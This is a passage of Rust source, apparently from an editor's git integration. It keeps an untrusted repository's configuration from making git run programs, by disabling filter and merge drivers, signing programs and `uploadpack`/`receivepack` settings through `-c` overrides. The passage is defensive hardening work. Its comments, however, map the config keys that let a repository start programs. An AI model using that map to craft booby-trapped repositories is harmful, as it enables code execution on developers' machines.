/// name. Git verifies for a `%G` placeholder, `--show-signature` and ref-filter's `%(signature)`,
/// and signs for `commit.gpgSign`, `tag.gpgSign` and `push.gpgSign`. Only the subcommands known
/// never to do so are listed, so that a new caller is protected by default.
///
/// A `log` (or `diff-tree`) without its format spelled out takes one from `format.pretty`, and
/// `--format=<name>` can name a `pretty.<name>` alias, both of which the repository can set.
fn command_may_run_signature_programs<S: AsRef<OsStr>>(args: &[S]) -> bool {
    let Some((subcommand, rest)) = args.split_first() else {
        return false;
    };
    let rest = rest.iter().map(|argument| argument.as_ref().to_str());
    match subcommand.as_ref().to_str() {
        Some("log" | "show" | "rev-list" | "reflog" | "whatchanged" | "diff-tree") => {
            !log_format_verifies_no_signature(rest)
        }
        Some("branch" | "for-each-ref") => rest
            .into_iter()
            .any(|argument| argument.is_none_or(|argument| argument.contains("%(signature"))),
        Some(
            "cat-file" | "check-attr" | "check-ignore" | "config" | "count-objects" | "fetch"
            | "ls-remote" | "ls-tree" | "merge-base" | "name-rev" | "pack-refs" | "remote"
            | "rev-parse" | "show-ref" | "symbolic-ref" | "update-ref" | "var" | "version"
            | "--version" | "write-tree",
        ) => false,
        _ => true,
    }
}

/// Whether the arguments of a `log`-like command pick a format that never asks for a signature,
/// without leaving the choice to the repository's configuration.
fn log_format_verifies_no_signature<'a>(
    arguments: impl IntoIterator<Item = Option<&'a str>>,
) -> bool {
    const BUILT_IN_FORMATS: &[&str] = &[
        "oneline",
        "short",
        "medium",
        "full",
        "fuller",
        "reference",
        "email",
        "raw",
        "mboxrd",
    ];
    let mut has_format = false;
    for argument in arguments {
        let Some(argument) = argument else {
            return false;
        };
        if argument.contains("%G") || argument.starts_with("--show-sig") {
            return false;
        }
        if argument == "--oneline" || argument == "--pretty" {
            has_format = true;
        } else if let Some(format) = argument
            .strip_prefix("--format=")
            .or_else(|| argument.strip_prefix("--pretty="))
        {
            // Anything else is looked up among the `pretty.<name>` aliases, by prefix.
            let names_no_alias = format.is_empty()
                || format.contains('%')
                || format.starts_with("format:")
                || format.starts_with("tformat:")
                || BUILT_IN_FORMATS.contains(&format);
            if !names_no_alias {
                return false;
            }
            has_format = true;
        }
    }
    has_format
}

/// Whether a command that may run filter or signature programs can also run git inside a
/// submodule, under the submodule's own configuration.
/// `status` and `diff` get `--ignore-submodules=dirty` (see `untrusted_subcommand_guards`); the
/// others listed were seen not to look inside a submodule (git 2.47) unless asked to recurse.
/// `reset` is not among them because the repository's `submodule.recurse` turns recursion on
/// for it without any flag, `push` can recurse into submodules and sign there, and `fetch`
/// fetches inside a submodule whose recorded commit changed unless told otherwise, connecting
/// with the submodule's own `remote.<name>.uploadpack`.
fn command_may_look_inside_submodules<S: AsRef<OsStr>>(args: &[S]) -> bool {
    let Some((subcommand, rest)) = args.split_first() else {
        return false;
    };
    if matches!(subcommand.as_ref().to_str(), Some("push" | "fetch")) {
        return true;
    }
    let asks_to_recurse = rest.iter().any(|argument| {
        argument
            .as_ref()
            .to_str()
            .is_none_or(|argument| argument.starts_with("--recurse-submodules"))
    });
    command_may_run_filters(args)
        && (asks_to_recurse
            || !matches!(
                subcommand.as_ref().to_str(),
                Some(
                    "status"
                        | "diff"
                        | "hash-object"
                        | "cat-file"
                        | "check-attr"
                        | "update-index"
                        | "ls-files"
                )
            ))
}

/// Whether a command can connect to another repository, which for a local path or a `file://`
/// URL runs the program named by `remote.<name>.uploadpack` (fetching) or `receivepack`
/// (pushing). Git takes the first of several values of these, so a `-c` option cannot replace the
/// repository's own. A lazy fetch of a partial clone's missing objects connects too, from any
/// command; `build_command` stops that with `GIT_NO_LAZY_FETCH` instead.
fn command_may_contact_remotes<S: AsRef<OsStr>>(args: &[S]) -> bool {
    let Some((subcommand, rest)) = args.split_first() else {
        return false;
    };
    match subcommand.as_ref().to_str() {
        Some("fetch" | "pull" | "push" | "ls-remote" | "submodule" | "clone") => true,
        Some("remote") => rest
            .iter()
            .map(|argument| argument.as_ref().to_str())
            .find(|argument| argument.is_none_or(|argument| !argument.starts_with('-')))
            .is_some_and(|argument| {
                argument.is_none_or(|argument| {
                    matches!(argument, "show" | "update" | "prune" | "set-head")
                })
            }),
        _ => false,
    }
}

/// What a git command refused for [`GitBinary::untrusted_config_overrides`] failing says, as the
/// `-c` key without a section that makes git stop before running anything.
const UNTRUSTED_FILTERS_NOT_DISABLED: &str = i18n::msg!(
    "git was not run because the filters of the untrusted repository could not be turned off"
);

/// What a command that may connect to another repository says when the untrusted repository (or
/// a submodule) sets `remote.<name>.uploadpack` or `receivepack`, as a `-c` key without a
/// section, like [`UNTRUSTED_FILTERS_NOT_DISABLED`].
const UNTRUSTED_REMOTE_PROGRAMS_REFUSED: &str = i18n::msg!(
    "git that connects to a remote was not run because the uploadpack / receivepack settings of the untrusted repository can start programs"
);

/// The `-c` options that make git refuse to run anything and say `refusal`: git fails on a key
/// without a section before it runs anything, and its error quotes the first such key. The
/// English key, which is always passed and always last, is what refuses. The translation before
/// it only changes what the error says, because the catalog can come from the user's
/// configuration directory, which is not trusted, and a translation with a `.` would be a key git
/// accepts. A translation git would not quote as a key without a section is left out.
fn refusal_config_args(refusal: &'static str) -> Vec<&'static str> {
    let translated = i18n::tr(refusal);
    let mut args = Vec::with_capacity(4);
    if translated != refusal
        && !translated.trim().is_empty()
        && translated.len() <= 1024
        && !translated.contains(['.', '=', '\0'])
    {
        args.extend(["-c", translated]);
    }
    args.extend(["-c", refusal]);
    args
}

/// Why a commit in an untrusted repository was made without the signature its configuration asks
/// for. The commit itself was made. Shown through `i18n::tr`, also on a remote server, which
/// translates it with its own bundled catalog into the display language the client sent, and
/// leaves it in English when the client sent none.
pub const UNTRUSTED_GPG_CONFIG_IGNORED: &str = i18n::msg!(
    "The gpg settings of the untrusted repository are not used. Committed without a signature."
);

/// What a remote server from before [`UNTRUSTED_GPG_CONFIG_IGNORED`] was in English sends instead.
const UNTRUSTED_GPG_CONFIG_IGNORED_BEFORE_TRANSLATION: &str =
    "未信頼のリポジトリの gpg 設定は使いません。署名せずにコミットしました。";

/// A commit that worked, but unsigned for [`UNTRUSTED_GPG_CONFIG_IGNORED`]. Returned as an error so
/// that the reason reaches the user, also from a remote server, which sends errors as text.
#[derive(Debug, Error)]
#[error("{}", i18n::tr(UNTRUSTED_GPG_CONFIG_IGNORED))]
pub struct CommittedWithoutSignature;

/// Whether an error from a commit is [`CommittedWithoutSignature`], also when it came from a
/// remote server as text. A current server also tags the error, so its sentence may be in any
/// language; an older one sends only the sentence, in Japanese.
pub fn is_committed_without_signature(error: &anyhow::Error) -> bool {
    if error.downcast_ref::<CommittedWithoutSignature>().is_some() {
        return true;
    }
    let text = format!("{error:#}");
    [
        UNTRUSTED_GPG_CONFIG_IGNORED,
        i18n::tr(UNTRUSTED_GPG_CONFIG_IGNORED),
        UNTRUSTED_GPG_CONFIG_IGNORED_BEFORE_TRANSLATION,
    ]
    .iter()
    .any(|message| text.contains(message))
}

/// The value git uses for a signing setting nobody set, for each setting that names a program
/// to run or decides which one runs or what it trusts.
fn signing_setting_default(key: &str) -> Option<&'static str> {
    match key {
        "gpg.program" | "gpg.openpgp.program" => Some("gpg"),
        "gpg.x509.program" => Some("gpgsm"),
        "gpg.ssh.program" => Some("ssh-keygen"),
        "gpg.format" => Some("openpgp"),
        // Empty stops git from running a key command and makes it trust no signer.
        "gpg.ssh.defaultkeycommand" | "gpg.ssh.allowedsignersfile" | "gpg.ssh.revocationfile" => {
            Some("")
        }
        _ => None,
    }
}

/// How `build_command` keeps an untrusted repository's own configuration from making git run a
/// program.
#[derive(Debug, Default, PartialEq)]
struct UntrustedConfigOverrides {
    /// Filter drivers to disable.
    filter_drivers: BTreeSet<String>,
    /// The repository's `merge.<driver>.driver` settings, each with the program to run instead:
    /// the user's own (system or global) one, or `false`, which leaves the file conflicted rather
    /// than merged.
    merge_drivers: BTreeMap<String, String>,
    /// The repository's `remote.<name>.uploadpack` and `receivepack` settings, which `-c` cannot
    /// replace (see [`command_may_contact_remotes`]).
    remote_programs: BTreeSet<String>,
    /// The repository's signing settings, each with the value to use instead: the user's own
    /// (system or global) one, or git's default.
    signing_settings: BTreeMap<String, String>,
    /// Some signing setting of the repository has no value of the user's own, so signing would
    /// not go through the program the user chose.
    signing_disabled: bool,
    /// `commit.gpgSign` is on.
    signing_requested: bool,
}

impl UntrustedConfigOverrides {
    /// A submodule's drivers and signing settings, which reach git running inside it through
    /// `GIT_CONFIG_PARAMETERS`. Whether the superproject signs stays the superproject's.
    fn add_submodule(&mut self, submodule: Self) {
        self.filter_drivers.extend(submodule.filter_drivers);
        for (key, value) in submodule.merge_drivers {
            self.merge_drivers.entry(key).or_insert(value);
        }
        self.remote_programs.extend(submodule.remote_programs);
        for (key, value) in submodule.signing_settings {
            self.signing_settings.entry(key).or_insert(value);
        }
    }

    fn signing_is_skipped(&self) -> bool {
        self.signing_disabled && self.signing_requested
    }

    fn args(&self) -> Vec<String> {
        let mut args = filter_driver_overrides(&self.filter_drivers);
        for (key, value) in &self.merge_drivers {
            args.extend(["-c".to_string(), format!("{key}={value}")]);
        }
        for (key, value) in &self.signing_settings {
            args.extend(["-c".to_string(), format!("{key}={value}")]);
        }
        if self.signing_disabled {
            for key in ["commit.gpgSign", "tag.gpgSign", "push.gpgSign"] {
                args.extend(["-c".to_string(), format!("{key}=false")]);
            }
        }
        args
    }
}

/// Git's reading of a boolean setting; a key without `=` is true.
fn config_bool(value: Option<&[u8]>) -> bool {
    let Some(value) = value else {
        return true;
    };
    let value = String::from_utf8_lossy(value).trim().to_ascii_lowercase();
    match value.as_str() {
        "true" | "yes" | "on" => true,
        "false" | "no" | "off" | "" => false,
        number => number.parse::<i64>().is_ok_and(|number| number != 0),
    }
}

/// What [`GitBinary::read_untrusted_config`] asks `git config --get-regexp` for.
const UNTRUSTED_CONFIG_PATTERN: &str =
    r"^(filter|gpg)\.|^commit\.gpgsign$|^merge\..+\.driver$|^remote\..+\.(uploadpack|receivepack)$";

/// The subsection of `key` (`<section>.<subsection>.<variable>`) if its section and variable are
/// the ones given; the subsection may itself hold dots.
fn config_subsection<'a>(key: &'a str, section: &str, variable: &str) -> Option<&'a str> {
    key.strip_prefix(section)?
        .strip_prefix('.')?
        .strip_suffix(variable)?
        .strip_suffix('.')
        .filter(|subsection| !subsection.is_empty())
}

/// [`UntrustedConfigOverrides`] from the output of
/// `git config -z [--show-scope] --get-regexp` [`UNTRUSTED_CONFIG_PATTERN`].
///
/// The user's own (system and global) filter drivers, such as Git LFS, stay: the repository
/// cannot change them. Without `--show-scope` (git before 2.26) every driver is disabled and
/// every signing setting counts as the repository's. A driver name `-c` cannot carry (one holding
/// `=`, which ends the key) or that is not UTF-8 is an error, so that the caller refuses the
/// command rather than lets it run the driver.
fn untrusted_config_overrides(output: &[u8], with_scope: bool) -> Result<UntrustedConfigOverrides> {
    let mut overrides = UntrustedConfigOverrides::default();
    let mut users_signing_settings = HashMap::<String, Option<String>>::default();
    let mut repository_signing_settings = BTreeSet::new();
    let mut users_merge_drivers = HashMap::<String, String>::default();
    let mut repository_merge_drivers = BTreeSet::new();
    let mut records = output
        .split(|byte| *byte == b'\0')
        .filter(|record| !record.is_empty());
    loop {
        let scope = if with_scope {
            match records.next() {
                Some(scope) => Some(scope),
                None => break,
            }
        } else {
            None
        };
        let Some(record) = records.next() else {
            anyhow::ensure!(scope.is_none(), "a config scope without a key");
            break;
        };
        let is_users_own = matches!(scope, Some(b"system" | b"global"));
        let (key, value) = match record.iter().position(|byte| *byte == b'\n') {
            Some(newline) => (&record[..newline], Some(&record[newline + 1..])),
            None => (record, None),
        };
        if key == b"commit.gpgsign" {
            overrides.signing_requested = config_bool(value);
        } else if key.starts_with(b"filter.") {
            if is_users_own {
                continue;
            }
            let key = std::str::from_utf8(key)
                .context("a filter driver whose name is not UTF-8 cannot be disabled")?;
            let Some((name, _variable)) = key
                .strip_prefix("filter.")
                .and_then(|rest| rest.rsplit_once('.'))
            else {
                continue;
            };
            anyhow::ensure!(
                !name.contains('='),
                "the filter driver {name:?} cannot be disabled with -c"
            );
            overrides.filter_drivers.insert(name.to_string());
        } else if key.starts_with(b"merge.") {
            let key = std::str::from_utf8(key)
                .context("a merge driver whose name is not UTF-8 cannot be disabled")?;
            let Some(name) = config_subsection(key, "merge", "driver") else {
                continue;
            };
            anyhow::ensure!(
                !name.contains('='),
                "the merge driver {name:?} cannot be disabled with -c"
            );
            if is_users_own {
                // A driver set without `=` names no program; git then leaves the file conflicted.
                let value = value
                    .and_then(|value| std::str::from_utf8(value).ok())
                    .unwrap_or("false");
                users_merge_drivers.insert(key.to_string(), value.to_string());
            } else {
                repository_merge_drivers.insert(key.to_string());
            }
        } else if key.starts_with(b"remote.") {
            if !is_users_own {
                overrides
                    .remote_programs
                    .insert(String::from_utf8_lossy(key).into_owned());
            }
        } else if let Ok(key) = std::str::from_utf8(key)
            && signing_setting_default(key).is_some()
        {
            if is_users_own {
                let value = value.and_then(|value| std::str::from_utf8(value).ok());
                users_signing_settings.insert(key.to_string(), value.map(str::to_string));
            } else {
                repository_signing_settings.insert(key.to_string());
            }
        }
    }
    for key in repository_signing_settings {
        let users_value = users_signing_settings.get(&key).cloned().flatten();
        let value = match users_value {
            Some(value) => value,
            None => {
                overrides.signing_disabled = true;
                signing_setting_default(&key)
                    .unwrap_or_default()
                    .to_string()
            }
        };
        overrides.signing_settings.insert(key, value);
    }
    for key in repository_merge_drivers {
        let value = users_merge_drivers
            .remove(&key)
            .unwrap_or_else(|| "false".to_string());
        overrides.merge_drivers.insert(key, value);
    }
    Ok(overrides)
}

/// How deep [`GitBinary::untrusted_config_overrides`] follows submodules inside submodules before
/// refusing the command.
const MAX_UNTRUSTED_SUBMODULE_DEPTH: usize = 8;

/// A path as `git ls-files -z` prints it: unquoted, relative, and UTF-8 on Windows.
fn path_from_git_output(bytes: &[u8]) -> Result<PathBuf> {
    #[cfg(unix)]
    {
        use std::os::unix::ffi::OsStrExt as _;
        Ok(PathBuf::from(OsStr::from_bytes(bytes)))
    }
    #[cfg(not(unix))]
    {
        Ok(PathBuf::from(
            std::str::from_utf8(bytes).context("a path git printed is not UTF-8")?,
        ))
    }
}

/// The `-c` options that stop `drivers` from running anything. An empty program is no filter,
/// and `required` is reset because a required driver without a program fails the command.
fn filter_driver_overrides(drivers: &BTreeSet<String>) -> Vec<String> {
    drivers
        .iter()
        .flat_map(|name| {
            ["clean=", "smudge=", "process=", "required=false"]
                .into_iter()
                .flat_map(move |setting| ["-c".to_string(), format!("filter.{name}.{setting}")])
        })
        .collect()
}

/// Whether the repository with `git_directory` is a partial clone, from the `.promisor` file
/// beside each pack its promisor remote sent. It only decides whether reading the configuration
/// is worth it to let lazy fetches through; a partial clone it misses just fetches nothing.
async fn is_partial_clone(git_directory: &Path) -> bool {
    use futures::StreamExt as _;

    // A linked worktree keeps its objects in the main repository.
    let common_directory = match smol::fs::read_to_string(git_directory.join("commondir")).await {
        Ok(common_directory) => git_directory.join(common_directory.trim()),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => git_directory.to_path_buf(),
        Err(error) => {
            log::warn!("reading the commondir of {git_directory:?}: {error}");
            return false;
        }
    };
    let Ok(mut entries) = smol::fs::read_dir(common_directory.join("objects").join("pack")).await
    else {
        return false;
    };
    while let Some(entry) = entries.next().await {
        if entry.is_ok_and(|entry| {
            entry
                .path()
                .extension()
                .is_some_and(|extension| extension == "promisor")
        }) {
            return true;
        }
    }
    false
}

fn git_status_args(
    path_prefixes: &[RepoPath],
    untracked_files: StatusUntrackedFiles,
    git_version: Option<GitVersion>,
) -> Vec<OsString> {
    let mut args = vec![
        OsString::from("status"),
        OsString::from(
            if GitFeature::PorcelainVersion.is_supported_by(git_version) {
                "--porcelain=v1"
            } else {
                "--porcelain"
            },
        ),
        OsString::from(untracked_files.as_git_argument()),
    ];
    // Before git 2.18 `git status` fails outright on `--no-renames`; `GitStatus` parsing folds
    // the rename pairs those versions report instead.
    if GitFeature::StatusNoRenames.is_supported_by(git_version) {
        args.push(OsString::from("--no-renames"));
    }
    args.extend([OsString::from("-z"), OsString::from("--")]);
    args.extend(path_prefixes.iter().map(|path_prefix| {
        if path_prefix.is_empty() {
            Path::new(".").into()
        } else {
            path_prefix.as_std_path().into()
        }
    }));
    args
}

fn suppress_diff_argument(version: Option<GitVersion>) -> &'static str {
    if GitFeature::ShowNoPatch.is_supported_by(version) {
        "--no-patch"
    } else {
        "-s"
    }
}

/// Arguments that, followed by a commit, print the commit's raw diff against its first parent.
fn commit_diff_args(version: Option<GitVersion>) -> &'static [&'static str] {
    if GitFeature::EmptyLogFormat.is_supported_by(version) {
        &[
            "show",
            "--format=",
            "-z",
            "--no-renames",
            "--raw",
            "--no-abbrev",
            "--first-parent",
        ]
    } else {
        // Before git 2.2 an empty `--format=` prints the default commit header ahead of the diff.
        &[
            "diff-tree",
            "--no-commit-id",
            "-r",
            "-z",
            "--raw",
            "--no-abbrev",
            "--no-renames",
            "--root",
            "-m",
            "--first-parent",
        ]
    }
}

fn cat_file_blob_batch_argument(version: Option<GitVersion>) -> &'static str {
    if GitFeature::CatFileBatchFormat.is_supported_by(version) {
        "--batch=%(objectsize)"
    } else {
        "--batch"
    }
}

/// The args of [`GitRepository::diff_tree`]. With `merge_base` already resolved they diff from
/// it, since git only accepts `--merge-base` since 2.30.
fn diff_tree_args(request: &DiffTreeType, merge_base: Option<&str>) -> Vec<OsString> {
    let mut args = match request {
        DiffTreeType::MergeBase { .. } | DiffTreeType::Since { .. } => {
            vec!["diff-tree", "-r", "-z", "--abbrev=64", "--no-renames"]
        }
        DiffTreeType::MergeBaseWithWorktree { .. } => {
            vec!["diff", "--raw", "-z", "--abbrev=64", "--no-renames"]
        }
    };
    match (request, merge_base) {
        (DiffTreeType::MergeBase { head, .. }, Some(merge_base)) => {
            args.extend([merge_base, head.as_str()])
        }
        (DiffTreeType::MergeBase { base, head }, None) => {
            args.extend(["--merge-base", base.as_str(), head.as_str()])
        }
        (DiffTreeType::MergeBaseWithWorktree { .. }, Some(merge_base)) => args.push(merge_base),
        (DiffTreeType::MergeBaseWithWorktree { base }, None) => {
            args.extend(["--merge-base", base.as_str()])
        }
        (DiffTreeType::Since { base, head }, _) => args.extend([base.as_str(), head.as_str()]),
    }
    // Without a terminator git cannot tell a branch named `docs/rewrite` from a
    // `docs/rewrite` directory in the working tree.
    args.push("--");
    args.into_iter().map(OsString::from).collect()
}

async fn resolve_merge_base(git: &GitBinary, base: &str, head: &str) -> Result<String> {
    let output = git
        .build_command(&["merge-base", base, head])
        .await
        .output()
        .await?;
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        anyhow::bail!("git merge-base failed: {stderr}");
    }
    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
}

fn log_order_argument(order: LogOrder, version: Option<GitVersion>) -> &'static str {
    if order == LogOrder::AuthorDateOrder && !GitFeature::AuthorDateOrder.is_supported_by(version) {
        // Commit dates are the closest order that git before 1.8.4 can sort by.
        return LogOrder::DateOrder.as_arg();
    }
    order.as_arg()
}

fn branch_list_args(version: Option<GitVersion>) -> Vec<String> {
    let has_branch_list_atoms = GitFeature::BranchListAtoms.is_supported_by(version);
    // Empty fields keep the layout `parse_branch_input` expects;
    // `complete_branches_without_head_and_track_atoms` makes up for them.
    let head = if has_branch_list_atoms { "%(HEAD)" } else { "" };
    // `%(upstream:track)` walks the history of every branch with an upstream, which on a
    // repository with thousands of them doubled the cost of the listing that runs on every ref
    // change. Only the current branch's counts are shown anywhere, and `count_head_tracking`
    // asks for just those.
    let upstream_track = "";
    let committer_date = if GitFeature::UnixDateFormat.is_supported_by(version) {
        "%(committerdate:unix)"
    } else {
        "%(committerdate:raw)"
    };
    let fields = [
        head,
        "%(objectname)",
        "%(parent)",
        "%(refname)",
        "%(upstream)",
        upstream_track,
        committer_date,
        "%(authorname)",
        "%(contents:subject)",
    ]
    .join("%00");
    // Without wildmatch, `**/*` only matches refs nested in a directory (such as
    // `refs/heads/a/b`, but not `refs/heads/main`), while a prefix matches every ref below it.
    let [heads_pattern, remotes_pattern] = if has_branch_list_atoms {
        ["refs/heads/**/*", "refs/remotes/**/*"]
    } else {
        ["refs/heads/", "refs/remotes/"]
    };
    vec![
        "for-each-ref".to_string(),
        heads_pattern.to_string(),
        remotes_pattern.to_string(),
        "--format".to_string(),
        fields,
    ]
}

/// Marks an upstream that no longer exists (as after `git fetch --prune`) as gone. The listing
/// does not ask for `%(upstream:track)`, whose `[gone]` would say so (and which before git 2.13
/// reported nothing, or on git 1.9 a bogus count, for such an upstream).
fn mark_missing_upstreams_gone(branches: &mut [Branch]) {
    let listed_refs = branches
        .iter()
        .map(|branch| branch.ref_name.clone())
        .collect::<HashSet<_>>();
    for branch in branches.iter_mut() {
        if let Some(upstream) = branch.upstream.as_mut()
            && (upstream.ref_name.starts_with("refs/remotes/")
                || upstream.ref_name.starts_with("refs/heads/"))
            && !listed_refs.contains(&upstream.ref_name)
        {
            upstream.tracking = UpstreamTracking::Gone;
        }
    }
}

/// Git before 1.9 has no `%(HEAD)`, so this marks the current branch separately.
async fn complete_branches_without_head_and_track_atoms(git: &GitBinary, branches: &mut [Branch]) {
    let output = match git
        .build_command(&["symbolic-ref", "--quiet", "HEAD"])
        .await
        .output()
        .await
    {
        Ok(output) => output,
        Err(error) => {
            log::warn!("failed to read the current branch: {error:#}");
            return;
        }
    };
    // Fails when HEAD is detached, in which case no branch is current.
    if !output.status.success() {
        return;
    }
    let head = String::from_utf8_lossy(&output.stdout).trim().to_string();
    if let Some(branch) = branches
        .iter_mut()
        .find(|branch| branch.ref_name.as_ref() == head)
    {
        branch.is_head = true;
    }
}

/// Counts how far the current branch is ahead of and behind its upstream, in place of
/// `%(upstream:track)` for every branch. Other branches keep zero counts: nothing shows them,
/// and counting them would cost a history walk per branch.
async fn count_head_tracking(git: &GitBinary, branches: &mut [Branch]) {
    let Some(branch) = branches.iter_mut().find(|branch| branch.is_head) else {
        return;
    };
    let Some(upstream) = branch.upstream.as_mut() else {
        return;
    };
    if upstream.tracking.is_gone() {
        return;
    }
    let range = format!("{}...{}", upstream.ref_name, branch.ref_name);
    match git
        .run(&["rev-list", "--left-right", "--count", &range])
        .await
    {
        Ok(counts) => match parse_left_right_counts(&counts) {
            Some((behind, ahead)) => {
                upstream.tracking =
                    UpstreamTracking::Tracked(UpstreamTrackingStatus { ahead, behind });
            }
            None => log::warn!("unexpected `git rev-list --left-right --count` output {counts:?}"),
        },
        Err(error) => log::warn!("failed to count the commits in {range}: {error:#}"),
    }
}

/// Parses the `<left>\t<right>` counts of `git rev-list --left-right --count`.
fn parse_left_right_counts(output: &str) -> Option<(u32, u32)> {
    let mut counts = output.split_whitespace();
    let left = counts.next()?.parse().ok()?;
    let right = counts.next()?.parse().ok()?;
    Some((left, right))
}

/// Stands in for `git worktree list` before git 2.7. Linked worktrees can't be created before
/// git 2.5, so this reports the main worktree the way `git worktree list` would; for a bare
/// repository that entry has no HEAD, which `parse_worktrees_from_str` skips too.
async fn list_main_worktree(
    git: &GitBinary,
    common_dir: &Path,
    main_worktree_path: Option<PathBuf>,
) -> Result<Vec<Worktree>> {
    let Some(main_worktree_path) = main_worktree_path else {
        return Ok(Vec::new());
    };
    // The main worktree's HEAD is the one in the common directory, even for a linked worktree.
    let mut git_dir_argument = OsString::from("--git-dir=");
    git_dir_argument.push(common_dir);
    let head_output = git
        .build_command(&[
            git_dir_argument.as_os_str(),
            OsStr::new("rev-parse"),
            OsStr::new("--verify"),
            OsStr::new("--quiet"),
            OsStr::new("HEAD"),
        ])
        .await
        .output()
        .await?;
    // `git worktree list` shows the null object ID for an unborn branch.
    let sha = if head_output.status.success() {
        String::from_utf8_lossy(&head_output.stdout)
            .trim()
            .to_string()
    } else {
        "0".repeat(40)
    };
    let ref_output = git
        .build_command(&[
            git_dir_argument.as_os_str(),
            OsStr::new("symbolic-ref"),
            OsStr::new("--quiet"),
            OsStr::new("HEAD"),
        ])
        .await
        .output()
        .await?;
    let ref_name = ref_output.status.success().then(|| {
        String::from_utf8_lossy(&ref_output.stdout)
            .trim()
            .to_string()
            .into()
    });
    Ok(vec![Worktree {
        path: main_worktree_path,
        ref_name,
        sha: sha.into(),
        is_main: true,
        is_bare: false,
    }])
}

/// The message of `git stash save`. Only the scripted `git stash` of git before 2.22, the one
/// that runs `git stash save` here for real, reads a `--` before the message as the end of the
/// options; later ones keep it in the message, so it's added only where it's needed.
fn stash_save_message_args(message: &str) -> Vec<String> {
    if message.starts_with('-') {
        vec!["--".to_string(), message.to_string()]
    } else {
        vec![message.to_string()]
    }
}

/// A `git stash` command line, optionally followed by the paths asked to be stashed.
struct StashCommand {
    args: Vec<String>,
    with_requested_paths: bool,
}

/// The `git stash` command for [`GitRepository::stash_paths`] before git 2.18, which stashes
/// untracked files given by pathspec wrongly (and before 2.13 takes no pathspec at all). The Git
/// panel only asks for every change (`git::StashAll`) or every change but the untracked files
/// (`git::StashTracked`), so the request is told apart by whether it names untracked files
/// rather than matched path by path, which also stashes what changed since the panel's last scan.
fn legacy_stash_command(
    requested_paths: &[RepoPath],
    status: &GitStatus,
    message: Option<&str>,
    version: Option<GitVersion>,
) -> Result<StashCommand> {
    let mut args = vec!["stash".to_string()];
    if requests_untracked_files(requested_paths, status) {
        GitFeature::CleanKeepsIgnoredFiles.require(
            version,
            i18n::tc!("git result", "Stash including untracked files"),
        )?;
        args.extend(["save", "--quiet", "--include-untracked"].map(String::from));
        if let Some(message) = message {
            args.extend(stash_save_message_args(message));
        }
        return Ok(StashCommand {
            args,
            with_requested_paths: false,
        });
    }
    if GitFeature::StashPush.is_supported_by(version) {
        args.extend(["push", "--quiet"].map(String::from));
        if let Some(message) = message {
            args.extend(["--message".to_string(), message.to_string()]);
        }
        args.push("--".to_string());
        return Ok(StashCommand {
            args,
            with_requested_paths: true,
        });
    }
    // `git stash save` also takes the staged new files that `git::StashTracked` leaves alone.
    let requested_paths = requested_paths.iter().collect::<HashSet<_>>();
    let takes_unrequested_new_files = status.entries.iter().any(|(path, status)| {
        matches!(
            status,
            FileStatus::Tracked(TrackedStatus {
                index_status: StatusCode::Added,
                ..
            })
        ) && !requested_paths.contains(path)
    });
    if takes_unrequested_new_files {
        GitFeature::StashPush.require(
            version,
            i18n::tc!("git result", "Stash that leaves newly staged files"),
        )?;
    }
    args.extend(["save", "--quiet"].map(String::from));
    if let Some(message) = message {
        args.extend(stash_save_message_args(message));
    }
    Ok(StashCommand {
        args,
        with_requested_paths: false,
    })
}

fn requests_untracked_files(requested_paths: &[RepoPath], status: &GitStatus) -> bool {
    let requested_paths = requested_paths.iter().collect::<HashSet<_>>();
    status
        .entries
        .iter()
        .any(|(path, status)| status.is_untracked() && requested_paths.contains(path))
}

/// Parses `git branch -r --contains` output such as `  origin/HEAD -> origin/main` and
/// `  origin/main` into what `for-each-ref --contains` yields once `refs/remotes/` is stripped.
fn parse_remote_branches_containing(output: &str) -> Vec<SharedString> {
    output
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.contains(" -> ") && !line.ends_with("/HEAD"))
        .map(|line| SharedString::from(line.to_string()))
        .collect()
}

/// Stands in for `git restore --source <commit> --worktree .` before git 2.23: writes the
/// commit's files over the working tree without touching the index, and deletes the tracked
/// files that the commit lacks.
async fn restore_worktree_without_git_restore(git: &mut GitBinary, commit_sha: &str) -> Result<()> {
    let working_directory = git.working_directory.clone();
    git.with_temp_index(async |git| {
        // Read from the copy of the index before `checkout` changes it.
        let missing_from_commit = git
            .run_raw(&[
                "diff-index",
                "--cached",
                "--name-only",
                "--diff-filter=A",
                "-z",
                commit_sha,
                "--",
            ])
            .await?;
        // Removed before `checkout`: afterwards, removing a file that differs from a restored one
        // only in case would take the restored file with it on a case-insensitive file system.
        for path in missing_from_commit
            .split('\0')
            .filter(|path| !path.is_empty())
        {
            let full_path = working_directory.join(path);
            match smol::fs::remove_file(&full_path).await {
                Ok(()) => {}
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
                Err(error) => {
                    return Err(error)
                        .with_context(|| format!("failed to remove {}", full_path.display()));
                }
            }
        }
        git.run(&["checkout", commit_sha, "--", "."]).await?;
        Ok(())
    })
    .await
}

/// Lists untracked files that should be included in a checkpoint, skipping
/// commonly ignored file types and files over 2MB.
async fn untracked_files_for_checkpoint(git: &GitBinary) -> Result<Vec<String>> {
    const MAX_SIZE: u64 = 2 * 1024 * 1024; // 2 MB

    // The extra checkpoint excludes are passed ad hoc via --exclude-from
    // rather than by mutating .git/info/exclude, whose writes would trigger a
    // rescan of the repository. The scratch file is placed directly in the
    // .git directory with a .tmp extension so that the worktree scanner
    // filters out the events it generates.
    let excludes_file_path = git
        .git_directory
        .join(format!("checkpoint-excludes-{}.tmp", Uuid::new_v4()));

    let delete_excludes_file = util::defer({
        let excludes_file_path = excludes_file_path.clone();
        let executor = git.executor.clone();
        move || {
            executor
                .spawn(async move {
                    smol::fs::remove_file(excludes_file_path).await.log_err();
                })
                .detach();
        }
    });

    smol::fs::write(&excludes_file_path, include_str!("./checkpoint.gitignore")).await?;

    let mut exclude_from_arg = OsString::from("--exclude-from=");
    exclude_from_arg.push(&excludes_file_path);
    let output = git
        .run(&[
            OsStr::new("ls-files"),
            OsStr::new("--others"),
            OsStr::new("--exclude-standard"),
            OsStr::new("-z"),
            exclude_from_arg.as_os_str(),
        ])
        .await;

    smol::fs::remove_file(&excludes_file_path).await.ok();
    delete_excludes_file.abort();
    let output = output?;

    let working_directory = git.working_directory.clone();
    let size_checks = output
        .split('\0')
        .filter(|path| !path.is_empty())
        .map(|path| {
            let full_path = working_directory.join(path);
            let path = path.to_string();
